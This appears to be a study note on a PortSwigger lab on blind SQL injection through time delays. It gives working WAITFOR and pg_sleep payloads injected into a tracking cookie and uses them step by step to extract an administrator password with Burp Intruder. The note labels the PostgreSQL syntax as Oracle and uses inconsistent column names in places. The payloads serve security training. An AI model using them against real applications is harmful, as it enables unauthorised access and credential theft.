---
TItle: SQL injection by triggering time delays
Lab: "[SQL Injection by Time Delays](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/exploiting-blind-sql-injection-by-triggering-time-delays)"
Video: "[Video from Intigriti](https://www.youtube.com/watch?v=xHzH00vyVHA)"
Resource: "[SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)"
---
### Method

>[!Example]
>Using this technique, we can retrieve data by testing one character at a time:
>`'; IF (1=2) WAITFOR DELAY '0:0:10'-- `
>`'; IF (1=1) WAITFOR DELAY '0:0:10'--`
> The query below we are testing if the character is bigger than M, if true will trigger delay
>`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
>

>[!NOTE]
>There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.


## Summary
If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.


## Method

Find a vulnerable field and check if when we add the time delay syntax the response takes time to reply. If it does we can ask yes/no questions to the database to help us break into it.

The vulnerable field on this occasion was within the cookie field of th request.
Below is syntax for Oracle database

```http
GET / HTTP/2
Host: 0a71004d04eff56880343a77000f0001.web-security-academy.net
Cookie: TrackingId=cJdUAWqHMs9QRGoa'|| (select case when (1=1) then pg_sleep(2) else pg_sleep(-1)end)--; session=YR3ok9qtUguhiw8X5p6JXLtm1XNRcvj7
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```
#### 1st Confirm Field is Vulnerable
	'||pg_sleep(2)--

#### 2nd Confirm Users Table and Username exist
	'|| (select case when (1=1) then pg_sleep(2) else pg_sleep(-1)end)--
	'|| (select case when (username='administrator') then pg_sleep(2) else pg_sleep(-1)end from users)--
	
	

#### 3rd Enumerate Password Length
Using burp, we can automate the discovery of the request below by changing the number 25 to different lengths.

	'|| (select case when (user='administrator' and LENGTH(password)>25) then pg_sleep(2) else pg_sleep(-1)end from users)--

#### 4th Enumerating Password + SubString
With a similar technique, now we're going to be testing the first character of the password is A, with Burp Intruder ClusterBomb we will Enumerate all the letters. 
If the letter is correct, the application is going to sleep for 10 seconds and we will proceed to enumerate all characters based on our discovery.

	'|| (SELECT CASE WHEN (user='administrator' AND substring(password,1,1)='a') THEN pg_sleep(2) ELSE pg_sleep(-1)END FROM users)--


#### 5th Intruder Burp
On Intruder after running the ClusterBomb, we can highlight all response that took longer to reply.
Then export the result into a file so we can extract the password easy
![[Pasted image 20260926140200.png]]

After saving into a file we can run the below to extract the password, original file will be save into columns so we need to use the `tr` command to merge them into a line

```bash
head /tmp/password -n 30 | tr -d `\n`
```

![[Pasted image 20260926140307.png]]

